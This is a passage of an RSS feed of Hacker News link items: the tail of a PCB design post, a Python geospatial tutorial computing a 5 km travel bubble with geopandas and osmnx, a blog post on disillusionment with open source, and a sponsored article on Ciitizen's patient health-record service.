<p>Of course, there’s some iteration between the schematic and the PCB. After physically placing the ribbon cable connector and MCU, the traces all crossed over each other, so I had to reassign all the pins so it made sense physically.</p>

<p>There are also physical constraints about how USB data lines are run, and how the electrostatic protection chip wants to be placed for the most protection.</p>

<p>So, as simple as this board is, I spent a fair amount of time getting all of that right.</p>

<p>I found myself getting lost in the abstractness of holes and traces and footprints, so it was helpful to ground myself by occasionally loading the PCB in KiCad’s 3D viewer.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/3d-view.png"><img src="https://chadaustin.me/images/sculpt/3d-view.png" alt="Schematic"></a>
<figcaption>3D View</figcaption>
</figure>

<h2 id="designing-the-final-board---manufacturing-and-testing-physical-fit">Designing the Final Board - Manufacturing and Testing Physical Fit</h2>

<p>I tried to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chadaustin.me/2021/02/wired-sculpt/">https://chadaustin.me/2021/02/wired-sculpt/</a></em></p>]]>
            </description>
            <link>https://chadaustin.me/2021/02/wired-sculpt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223805</guid>
            <pubDate>Mon, 22 Feb 2021 12:39:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculating your travel buffer with Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26223690">thread link</a>) | @staplebattery
<br/>
February 22, 2021 | https://pythoncharmers.com/blog/travel-distance-python-with-geopandas-folium-alphashape-osmnx-buffer.html | <a href="https://web.archive.org/web/*/https://pythoncharmers.com/blog/travel-distance-python-with-geopandas-folium-alphashape-osmnx-buffer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main"><div id="content">






<div>
    <div>
        <p><span>11 Feb 2021</span> 
            <span>(30 minutes read)</span>
        </p>
    </div>
    <table>
<!--         <tr>
            <td>Author</td>
            <td>Henry Walshaw</td>
        </tr>
        <tr>
            <td>Date</td>
            <td>11 Feb 2021</td>
        </tr> -->
        <tbody><tr>
            <td>Level</td>
            <td>Intermediate</td>
        </tr>
<!--         <tr>
            <td>Time to Read</td>
            <td>30 minutes</td>
        </tr> -->
        <tr>
            <td>Tools</td>
            <td>scikit-learn v0.23+, Python 3.7+</td>
        </tr>
        <tr>
            <td>Prerequisites</td>
            <td>Machine learning experience with scikit-learn</td>
        </tr>
    </tbody></table>

</div>




<p>Last year, many cities around the world imposed restrictions on how far
you can travel from home. Here we'll show how you can calculate your a
travel bubble around your home using some of the best Python tools for
spatial analysis selected from Python Charmers' <a href="https://pythoncharmers.com/training/python-for-geospatial-analysis/">Python for Geospatial Analysis</a> course.</p>

<p>First some setup. In Python, we rely on building on third party libraries for our analysis (and hopefully contributing back some of our own). Installation of the spatial libraries can sometimes be a challenge due to the compilation requirements but if you're using the <a href="https://www.anaconda.com/">Anaconda Python distribution</a> it is quite simple to get started. First do some installations with the <code>conda</code> install tool, followed by some extras with <code>pip</code>:</p>
<div><pre><span></span><code>conda install gdal fiona geopandas rtree descartes pyproj

pip install -U alphashape geopy osmnx folium
</code></pre></div>

<h2 id="imports">Imports</h2>
<p>The following are the imports we'll use for this example. For now don't worry about the individual imports - some may be familiar, and some may not - we'll discuss them in more depth as we go through the notebook.</p>
<div><pre><span></span><code><span>import</span> <span>alphashape</span>
<span>from</span> <span>descartes</span> <span>import</span> <span>PolygonPatch</span>
<span>import</span> <span>folium</span>
<span>import</span> <span>geopandas</span> <span>as</span> <span>gpd</span>
<span>from</span> <span>geopy.geocoders</span> <span>import</span> <span>Nominatim</span>
<span>from</span> <span>ipywidgets</span> <span>import</span> <span>interact</span><span>,</span> <span>fixed</span><span>,</span> <span>widgets</span>
<span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>
<span>import</span> <span>networkx</span> <span>as</span> <span>nx</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>osmnx</span> <span>as</span> <span>ox</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>from</span> <span>shapely</span> <span>import</span> <span>geometry</span>
</code></pre></div>

<div><pre><span></span><code><span>%</span><span>config</span> <span>InlineBackend</span><span>.</span><span>figure_format</span> <span>=</span> <span>'retina'</span>
<span>plt</span><span>.</span><span>rcParams</span><span>[</span><span>'figure.figsize'</span><span>]</span> <span>=</span> <span>(</span><span>10</span><span>,</span> <span>10</span><span>)</span>
</code></pre></div>


<h2 id="geocoding-an-address">Geocoding an address</h2>
<p>First we need a location. To do this we perform a process called "geocoding". This is the process of matching an address to a location on the ground. i.e. where is your house? You can use any address that you like, but for now I'll use my local Melbourne train station: Footscray.</p>
<p>The <code>geopy</code> library is a really convenient library that wraps up a bunch of online geocoding services and APIs into a simple consistent package. This means if you have an API key for Google you can use the Google Maps API via Python to get the location of an address, or if you have a Bing API key you can do the same. Importantly the address will be returned in a consistent way.</p>
<p>Normally I'd use the <a href="https://developer.here.com/documentation/geocoder/dev_guide/topics/quick-start-geocode.html">Here maps</a> API - it's a good one with a generous amount of free address searches when you sign up. For this example though I'll use the open <a href="https://nominatim.org/release-docs/develop/">Nominatim</a> geocoding API built on Open Street Map as it doesn't require any signup - you just need to set the user agent to tell them who you are.</p>
<div><pre><span></span><code><span>address</span> <span>=</span> <span>'Footscray Railway Station Victoria, 3011, Australia'</span>
<span>geocoder</span> <span>=</span> <span>Nominatim</span><span>(</span><span>user_agent</span><span>=</span><span>'Isochrone calculator'</span><span>)</span>
<span>location</span> <span>=</span> <span>geocoder</span><span>.</span><span>geocode</span><span>(</span><span>address</span><span>)</span>
<span>location</span>
</code></pre></div>

<div><pre><span></span><code>Location(Footscray, Hyde Street, Footscray, City of Maribyrnong, Victoria, 3011, Australia, (-37.8015202, 144.9025869, 0.0))
</code></pre></div>

<p>This works well and gives me be a <code>Location</code> that I can use to get the latitude and longitude values for the address easily.</p>
<div><pre><span></span><code><span>location</span><span>.</span><span>latitude</span><span>,</span> <span>location</span><span>.</span><span>longitude</span>
</code></pre></div>

<div><pre><span></span><code>(-37.8015202, 144.9025869)
</code></pre></div>

<p>As a side note, I can use this with the <code>folium</code> library to embed a quick interactive map in my notebook so I can see the address is in the place that I expect:</p>
<div><pre><span></span><code><span>m</span> <span>=</span> <span>folium</span><span>.</span><span>Map</span><span>((</span><span>location</span><span>.</span><span>latitude</span><span>,</span> <span>location</span><span>.</span><span>longitude</span><span>),</span> <span>max_zoom</span><span>=</span><span>20</span><span>,</span> <span>zoom_start</span><span>=</span><span>16</span><span>)</span>
<span>folium</span><span>.</span><span>Marker</span><span>((</span><span>location</span><span>.</span><span>latitude</span><span>,</span> <span>location</span><span>.</span><span>longitude</span><span>),</span> <span>popup</span><span>=</span><span>address</span><span>)</span><span>.</span><span>add_to</span><span>(</span><span>m</span><span>)</span>
<span>m</span>
</code></pre></div>



<p>At this point I could go and create a geometry and build this into a point I can use to help me find my travel bubble radius (in my case, 5km), but there are some nice shortcuts using Pandas and GeoPandas. First I create a Pandas <code>DataFrame</code> that contains the address I wish to geocode:</p>
<div><pre><span></span><code><span>home</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>([{</span><span>'address'</span><span>:</span> <span>address</span><span>}])</span>
<span>home</span>
</code></pre></div>

<div>

<table>
  <thead>
    <tr>
      <th></th>
      <th>address</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>Footscray Railway Station Victoria, 3011, Aust...</td>
    </tr>
  </tbody>
</table>
</div>

<p>Not very exciting, but if we wanted to we could use this to find the address of many points of interest. For example you might want to calculate a travel buffer around your home, your parents' home and your brothers and sisters' homes. For now we'll stick with one.</p>
<p>The <a href="https://geopandas.readthedocs.io/">GeoPandas</a> library is a Python library that extends the Pandas dataframe to work with spatial vector data (points, lines and polygons, or for example: addresses, roads, and suburb boundaries). It includes tools that will let you geocode your data using the geopy library as the back-end:</p>
<div><pre><span></span><code><span>home</span> <span>=</span> <span>gpd</span><span>.</span><span>tools</span><span>.</span><span>geocode</span><span>(</span><span>home</span><span>[</span><span>'address'</span><span>],</span> <span>Nominatim</span><span>,</span> <span>user_agent</span><span>=</span><span>'Isochrone calculator'</span><span>)</span>
</code></pre></div>

<p>Note here that we supply the geocoder class object and any parameters it requires as keyword arguments to this function. This returns a GeoPandas <code>GeoDataFrame</code> - a dataframe with a geometry that represents the point for each address.</p>


<div>

<table>
  <thead>
    <tr>
      <th></th>
      <th>geometry</th>
      <th>address</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>POINT (144.90259 -37.80152)</td>
      <td>Footscray, Hyde Street, Footscray, City of Mar...</td>
    </tr>
  </tbody>
</table>
</div>

<p>That's really handy, and we can easily put this on the same map as above:</p>
<div><pre><span></span><code><span>m</span> <span>=</span> <span>folium</span><span>.</span><span>Map</span><span>((</span><span>location</span><span>.</span><span>latitude</span><span>,</span> <span>location</span><span>.</span><span>longitude</span><span>),</span> <span>max_zoom</span><span>=</span><span>20</span><span>,</span> <span>zoom_start</span><span>=</span><span>16</span><span>)</span>
<span>folium</span><span>.</span><span>GeoJson</span><span>(</span><span>home</span><span>,</span> <span>tooltip</span><span>=</span><span>folium</span><span>.</span><span>GeoJsonTooltip</span><span>([</span><span>'address'</span><span>]))</span><span>.</span><span>add_to</span><span>(</span><span>m</span><span>)</span>
<span>m</span>
</code></pre></div>



<p>Note that in this case the tooltip can be more complex: if we have more fields we want to see we can place them all in the list and display it on our map.</p>
<h2 id="getting-the-street-network-within-a-given-distance-your-home">Getting the street network within a given distance your home</h2>
<p>In my case, I could move 5km from my home. However this not 5km as the crow flies (in a straight line), it is 5km of travel. So it's actually 5km as we move through a street network. To calculate what this is we need to download some of that street network data. First we'll need to find out what a boundary is around our home to download just the data we need.</p>
<p>How do we get this 5km bubble? In GIS, a buffer is a standard operation to expand out from a geometry by a set value. However we have a bit of an issue here: our data is in latitude and longitude (which is not metres) - if we try to buffer by 5000 we will get a very wrong answer! First we must re-project the data to a projection based in metres, perform the buffer, the project back.</p>
<p>A later blog post will discuss map projections and how to use them in Python, but for now we will create our bubble by projecting to the GDA2020 MGA Zone 55 projection (EPSG code 7855) to create the buffer before re-projecting back to the original GCS WGS84 projection.</p>
<div><pre><span></span><code><span>buffer</span> <span>=</span> <span>home</span><span>.</span><span>to_crs</span><span>(</span><span>epsg</span><span>=</span><span>7855</span><span>)</span><span>.</span><span>buffer</span><span>(</span><span>5000</span><span>)</span><span>.</span><span>to_crs</span><span>(</span><span>epsg</span><span>=</span><span>4326</span><span>)</span>
</code></pre></div>

<p>It's definitely worth seeing this on a map - this will be a 5000 metre circle around your home. If for example you used the interactive tool from <a href="https://www.theage.com.au/national/victoria/interactive-see-where-your-5km-lockdown-limit-ends-20200801-p55hns.html">the Age newspaper</a> you would get the same map.</p>
<div><pre><span></span><code><span>m</span> <span>=</span> <span>folium</span><span>.</span><span>Map</span><span>((</span><span>location</span><span>.</span><span>latitude</span><span>,</span> <span>location</span><span>.</span><span>longitude</span><span>),</span> <span>max_zoom</span><span>=</span><span>20</span><span>,</span> <span>zoom_start</span><span>=</span><span>12</span><span>)</span>
<span>folium</span><span>.</span><span>GeoJson</span><span>(</span><span>buffer</span><span>)</span><span>.</span><span>add_to</span><span>(</span><span>m</span><span>)</span>
<span>folium</span><span>.</span><span>GeoJson</span><span>(</span><span>home</span><span>,</span> <span>tooltip</span><span>=</span><span>folium</span><span>.</span><span>GeoJsonTooltip</span><span>([</span><span>'address'</span><span>]))</span><span>.</span><span>add_to</span><span>(</span><span>m</span><span>)</span>
<span>m</span>
</code></pre></div>



<p>Sure looks like I can go a long way! If only. Don't forget: every map is lying to you, even if it's not deliberate!</p>
<p>We'll use the bounds from this along with the <a href="https://osmnx.readthedocs.io/en/stable/">osmnx</a> library to extract the road network data from <a href="https://openstreetmap.org/">Open Street Map</a>. The osmnx library is a really powerful tool to extract and use data in Python from Open Street Map (the Wikipedia of maps). We'll talk more about how it works as we go on but for now let's grab the data and draw a simple plot:</p>
<div><pre><span></span><code><span>bounds</span> <span>=</span> <span>buffer</span><span>.</span><span>bounds</span><span>.</span><span>loc</span><span>[</span><span>0</span><span>]</span>
<span>bounds</span>
</code></pre></div>

<div><pre><span></span><code>minx    144.845830
miny    -37.846556
maxx    144.959347
maxy    -37.756484
Name: 0, dtype: float64
</code></pre></div>

<div><pre><span></span><code><span>region</span> <span>=</span> <span>ox</span><span>.</span><span>graph_from_bbox</span><span>(</span><span>bounds</span><span>[</span><span>'maxy'</span><span>],</span> <span>bounds</span><span>[</span><span>'miny'</span><span>],</span> <span>bounds</span><span>[</span><span>'minx'</span><span>],</span> <span>bounds</span><span>[</span><span>'maxx'</span><span>])</span>
</code></pre></div>



<p><img alt="png" src="https://pythoncharmers.com/blog/extras/Calculate%20your%205km%20travel%20bubble_25_0.png"></p>
<p>Note that this might take a couple of minutes to download from the Open Street Map servers depending on your internet connection. There are options to just download the road network or the walking network if you prefer, but we're looking at anywhere you can reach within 5km.</p>

<p>Conceptually there are two steps to calculating your 5km travel radius.
1. Calculate how much of the network that we can reach within 5km;
2. Draw an accurate boundary around this region.</p>
<h2 id="getting-all-the-nodes-in-the-graph-using-network-algorithms">Getting all the nodes in the graph using network algorithms</h2>
<p>As part ofcalculating the region of our street network graph we can reach first we need to get the nearest node in our graph to our starting point.</p>
<p>As a bonus this will be very simple as the geocoder we used was Nominatim which is built on top of Open Street Map - as long as we found an address we will be able to match it to a node.</p>
<div><pre><span></span><code><span>center_node</span> <span>=</span> <span>ox</span><span>.</span><span>get_nearest_node</span><span>(</span><span>region</span><span>,</span> <span>(</span><span>home</span><span>.</span><span>loc</span><span>[</span><span>0</span><span>,</span> <span>'geometry'</span><span>]</span><span>.</span><span>y</span><span>,</span> <span>home</span><span>.</span><span>loc</span><span>[</span><span>0</span><span>,</span> <span>'geometry'</span><span>]</span><span>.</span><span>x</span><span>))</span>

<span>center_node</span>  <span># this is the node ID</span>
</code></pre></div>



<p>Again the data we have extracted from Open Street Map is uses latitude and longitude as its current coordinate system. We need to project this data so that it's in a system that uses metres as its unit of measurement. Once again we'll use EPSG code 7855 - the GDA2020 MGA Zone 55 projection.</p>
<div><pre><span></span><code><span>region</span> <span>=</span> <span>ox</span><span>.</span><span>project_graph</span><span>(</span><span>region</span><span>,</span> <span>7855</span><span>)</span>
</code></pre></div>

<p>And now we can choose some distances of interest. Because it looks good we might increment all the way up to 5,000 metres in increments of 500 metres. Ultimately we will be interested in just the 5,000 metres. The methodology here was adapted from the osmnx <a href="https://github.com/gboeing/osmnx-examples/blob/master/notebooks/13-isolines-isochrones.ipynb">Isochrones example</a>.</p>
<div><pre><span></span><code><span>distances</span> <span>=</span> <span>np</span><span>.</span><span>arange</span><span>(</span><span>0</span><span>,</span> <span>5001</span><span>,</span> <span>500</span><span>)</span>
<span>distances</span>
</code></pre></div>

<div><pre><span></span><code>array([   0,  500, 1000, 1500, 2000, 2500, 3000, 3500, 4000, 4500, 5000])
</code></pre></div>

<div><pre><span></span><code><span># get one color for each isochrone</span>
<span>iso_colors</span> <span>=</span> <span>ox</span><span>.</span><span>plot</span><span>.</span><span>get_colors</span><span>(</span><span>n</span><span>=</span><span>len</span><span>(</span><span>distances</span><span>),</span> <span>cmap</span><span>=</span><span>'plasma'</span><span>,</span> <span>start</span><span>=</span><span>0</span><span>,</span> <span>return_hex</span><span>=</span><span>True</span><span>)</span>
</code></pre></div>

<div><pre><span></span><code><span>node_colors</span> <span>=</span> <span>{}</span>

<span>for</span> <span>trip_time</span><span>,</span> <span>color</span> <span>in</span> <span>zip</span><span>(</span><span>sorted</span><span>(</span><span>distances</span><span>,</span> <span>reverse</span><span>=</span><span>True</span><span>),</span> <span>iso_colors</span><span>):</span>
    <span>subgraph</span> <span>=</span> <span>nx</span><span>.</span><span>ego_graph</span><span>(</span><span>region</span><span>,</span> <span>center_node</span><span>,</span> <span>radius</span><span>=</span><span>trip_time</span><span>,</span> <span>distance</span><span>=</span><span>'length'</span><span>)</span>
    <span>for</span> <span>node</span> <span>in</span> <span>subgraph</span><span>.</span><span>nodes</span><span>():</span>
        <span>node_colors</span><span>[</span><span>node</span><span>]</span> <span>=</span> <span>color</span>

<span>nc</span> <span>=</span> <span>[</span><span>node_colors</span><span>[</span><span>node</span><span>]</span> <span>if</span> <span>node</span> <span>in</span> <span>node_colors</span> <span>else</span> <span>'none'</span> <span>for</span> <span>node</span> <span>in</span> <span>region</span><span>.</span><span>nodes</span><span>()]</span>
<span>ns</span> <span>=</span> <span>[</span><span>15</span> <span>if</span> <span>node</span> <span>in</span> <span>node_colors</span> <span>else</span> <span>0</span> <span>for</span> <span>node</span> <span>in</span> <span>region</span><span>.</span><span>nodes</span><span>()]</span>
<span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>ox</span><span>.</span><span>plot_graph</span><span>(</span><span>region</span><span>,</span> <span>node_color</span><span>=</span><span>nc</span><span>,</span> <span>node_size</span><span>=</span><span>ns</span><span>,</span> <span>node_alpha</span><span>=</span><span>0.8</span><span>,</span>
                        <span>edge_linewidth</span><span>=</span><span>0.2</span><span>,</span> <span>edge_color</span><span>=</span><span>'#999999'</span><span>)</span>
</code></pre></div>

<p><img alt="png" src="https://pythoncharmers.com/blog/extras/Calculate%20your%205km%20travel%20bubble_34_0.png"></p>
<p>From this visualisation you can see that I definitely can't go out as far as 5km as the crow flies. You can see …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pythoncharmers.com/blog/travel-distance-python-with-geopandas-folium-alphashape-osmnx-buffer.html">https://pythoncharmers.com/blog/travel-distance-python-with-geopandas-folium-alphashape-osmnx-buffer.html</a></em></p>]]>
            </description>
            <link>https://pythoncharmers.com/blog/travel-distance-python-with-geopandas-folium-alphashape-osmnx-buffer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223690</guid>
            <pubDate>Mon, 22 Feb 2021 12:25:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I’m Losing Trust in Open Source]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 31 (<a href="https://news.ycombinator.com/item?id=26223575">thread link</a>) | @bodegajed
<br/>
February 22, 2021 | https://gibson.ws/why-im-losing-trust-in-open-source/ | <a href="https://web.archive.org/web/*/https://gibson.ws/why-im-losing-trust-in-open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

		
					<!-- Image banner -->
					
					<!-- Image banner -->

					<div id="content">
						<div>
							<div>

	<div id="primary">
		<main id="main">

		
<article id="post-146">
			<!-- .entry-header -->

	<div>
		<p>Back when I was starting to code several years ago. I picked up The Cathedral and the Bazaar by Eric Raymond and I was blown away at the idea of free software. Just in case you are not familiar, free software as in freedom and not free beer. Free software back then was this super radical and idealistic concept where as you make a software product commercial or not, but when you distribute it you include the source code of it. The person who got your product would eventually continue to develop it and it will evolve and continually improve as it gets to many users. You then will be looking at their version of your product and will see how it has grown further. Think of it has a community garden where everyone grows their vegetable and anyone would then take pointers on some of your crops and grow their improved version. Eventually you’ll see where you are doing it wrong by looking at how they tend their garden. This is not necessarily free food for everyone – although it’s common. It’s freedom to copy and use my garden setup so we have bigger crops next harvest time.</p>
<p>This what happened to Linux, nodejs, Ruby etc.. I’ve believed in it much so I joined sourceforge joined a team, also started a project myself even. I followed this radical concept through the years and publish my projects openly on github. It was fun and there is some sort of social acceptance when people see your ugly looking code yet they accept it and submit their own ugly looking code as well.</p>
<p>Facebook, Apple, Google these companies are worth trillions of dollars and they all at one point when they are still small companies depended on open source. Their founders built an MVP and took money from VCs and then had to responsibly return their money 10x. They eventually all cashed out and now driving luxury sports cars. Meanwhile present day Linux desktop is still dead. Open source maintainers abandoning projects due to lack of time and interest. They say why not just use GPL but if you license your code using GPL you will not have users. Developers can’t even share the name of the software they are putting your code into because of these NDA they signed. Sometimes it’s just a simple request like attribution and compliance is still uncommon.</p>
<p>Life as a open source maintainer is sometimes a <a href="https://daniel.haxx.se/blog/2021/02/19/i-will-slaughter-you/">life threatening endeavor</a></p>
<p>Society, Conglomerates, and Capitalism killed free software and nobody cared. It’s all about 10x ROI and taking advantage of some poor idiot programmer clueless in business.</p>

			</div><!-- .entry-content -->
</article><!-- #post-146 -->

<!-- #comments -->

		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->
</div>
</div><!-- #content -->
</div>
</div></div>]]>
            </description>
            <link>https://gibson.ws/why-im-losing-trust-in-open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223575</guid>
            <pubDate>Mon, 22 Feb 2021 12:09:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ciitizen and the Patient Data Marketplace]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26223570">thread link</a>) | @bbirnbaum
<br/>
February 22, 2021 | https://outofpocket.health/p/ciitizen-and-the-patient-data-marketplace | <a href="https://web.archive.org/web/*/https://outofpocket.health/p/ciitizen-and-the-patient-data-marketplace">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2><strong>TL:DR&nbsp;</strong></h2><p>I wanted to use this as an opportunity to talk a little bit about patient data access, health data exchanges, and what <a href="https://www.ciitizen.com/">Ciitizen</a> is doing to help us take control of our healthcare data (with my take at the end).  </p><p><em>This is a sponsored post - you can read more about my rules/thoughts on sponsored posts <a href="https://outofpocket.health/p/an-update-about-out-of-pocket">here</a>. If you’re interested in having a sponsored post done, email nikhil@outofpocket.health.</em></p><p><a href="https://www.ciitizen.com/">Ciitizen</a> is a personal health record with the goal of making it easier to choose where you want your health data to go. It decided on its name based on what would permanently mess up my autocorrect going forward.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa14a66b-591d-4062-b948-1301cd22bd0f_1576x960.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa14a66b-591d-4062-b948-1301cd22bd0f_1576x960.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/fa14a66b-591d-4062-b948-1301cd22bd0f_1576x960.png&quot;,&quot;height&quot;:887,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>Ciitizen was founded by <a href="https://www.linkedin.com/in/mranilsethi/">Anil Sethi,</a><a href="https://twitter.com/HealthPrivacy?s=20">Deven McGraw, </a><a href="https://www.linkedin.com/in/bcarlsenca/">Brian Carlsen</a>, <a href="https://www.linkedin.com/in/faridvij/">Farid Vij </a>and <a href="https://www.linkedin.com/in/peeyushrai/">Peeyush Rai</a>. Initially they thought about forming a basketball team before landing on Ciitizen. Previously, Anil was the founder of Gliimpse, which is the personal health record company <a href="https://www.fastcompany.com/3062865/apple-acquires-personal-health-data-startup-gliimpse">acquired by Apple</a> which eventually became the underlying technology for Apple Health Records. Deven was previously the Deputy Director, Health Information Privacy at the HHS who wrote much of the HIPAA patient access guidance we operate under today. Brian Carlsen authored the NLM/NIH data standards that became SNOMED and other leading bioinformatics underpinnings. Farid and Peeyush bring the tech experience to the party. As you read more, I think you’ll realize this is as close to founder(s)-market-fit as you can possibly get.</p><p>The 100+ person company has raised more than $27 million so far from investors including Vijay Pande from a16z, Mike Pellini of Section 32, Verily, and Mubadala Ventures.&nbsp;</p><p>I knew the day would come where I’d have to explain a semi-complicated healthcare data product but I was hoping I’d have at least a few more months to live carefree first. Alas that is not the case. Just kidding - talking about Ciitizen is a great chance to explain how healthcare data moves around the ecosystem all without our knowledge.&nbsp;</p><p>Ciitizen gets your health records (think thousands of pages of incomprehensible, repetitive documents in one fat stack of a PDF) from the many parts of the healthcare system. Then it uses its fancy ML pipeline to create research-grade data from an otherwise hellish stack of PDFs and securely stores it under patient control. Simply sign a form that says “Ciitizen is allowed to get my data from hospitals on my behalf.” Finally, Ciitizen hits up hospitals, imaging centers, genetic labs, etc and gets all your records for you.&nbsp;</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc36ae850-8415-4557-823e-3f72fd3251db_1421x1600.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc36ae850-8415-4557-823e-3f72fd3251db_1421x1600.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c36ae850-8415-4557-823e-3f72fd3251db_1421x1600.jpeg&quot;,&quot;height&quot;:1600,&quot;width&quot;:1421,&quot;resizeWidth&quot;:560,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>This is, at its core, what a patient’s HIPAA Right of Access is meant to do. As patients we are allowed total access to our complete health history, but that doesn’t mean it’s easy to get. Sure, you can log into your patient portal if you have one and if you remember the password. But it wouldn’t give you the complete story. If you want all of the records (and are brave enough), you could pester each one of your providers for your data and they might charge you a fee, take a super long time dragging their feet getting the data to you, and likely violate a bunch of HIPAA regulations in the process. Then finally they’ll get a CD-ROM or something and you’ll have to ask any of your friends if they have a CD-ROM drive and they’ll laugh at you. Or they’ll point you to their portal which only has a fragment of your total health record, which sort of defeats the purpose?</p><p>Ciitizen prevents you from getting laughed at by your friends. Ciitizen’s technology automatically bugs providers on your behalf, receives the documents that come in all sorts of formats like faxes, scanned PDFs, mailed boxes of paper (I hate this industry so much), emails, etc. Then Ciitizen gets those documents, structures the clinical narrative into computable data, and gives it to you as a patient so you have your very own complete personal health record. They do this fast (well, healthcare fast) getting all of your records together in a few days vs. weeks or months. Some data comes even in minutes but the complete record takes time. For people with advanced diseases, days versus weeks makes a huge difference.&nbsp;</p><p>Right now they’ve started with cancer and rare neurological conditions and are moving into other areas like autoimmune diseases, eventually serving all patients with all conditions.</p><p>[Below are screenshots of what Anil’s late sister Tania would see in her Ciitizen profile. Data and screenshots shared with permission.]</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc4ac42c4-3462-4d3b-b23a-c1b8e6684023_1600x1315.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc4ac42c4-3462-4d3b-b23a-c1b8e6684023_1600x1315.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c4ac42c4-3462-4d3b-b23a-c1b8e6684023_1600x1315.png&quot;,&quot;height&quot;:1197,&quot;width&quot;:1456,&quot;resizeWidth&quot;:626,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F56f08f96-8896-4acd-8a6b-05bdb9eb2eb6_1600x1315.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F56f08f96-8896-4acd-8a6b-05bdb9eb2eb6_1600x1315.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/56f08f96-8896-4acd-8a6b-05bdb9eb2eb6_1600x1315.png&quot;,&quot;height&quot;:1197,&quot;width&quot;:1456,&quot;resizeWidth&quot;:612,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p><em>All extracted data is easily source verified to the original document.&nbsp;</em></p><p>There are a lot of companies building applications that retrieve and structure patient’s data, so I wanted to talk about some specific things Ciitizen is betting on as differentiation.</p><h3><strong>Data ingestion</strong></h3><p>Ciitizen’s secret sauce begins with the document ingestion and data structuring technology. First, they have some pretty fun automated processes that bother hospitals, clinics and labs at scale until they send over the patient’s health records to Ciitizen. They even made a <a href="http://www.patientrecordscorecard.com/">scorecard</a> on how well each hospital does this. This is my favorite part of the process because I, too, enjoy bothering people at scale.</p><p>Ciitizen then gathers the incoming documents, regardless of format and turns them into readable data using machine learning to understand the different sections of the forms, faxes, PDFs etc. This is necessary to contextualize the data in each section (e.g. histological subtype from pathology report, medications from chemo flow sheets and findings from imaging reports, 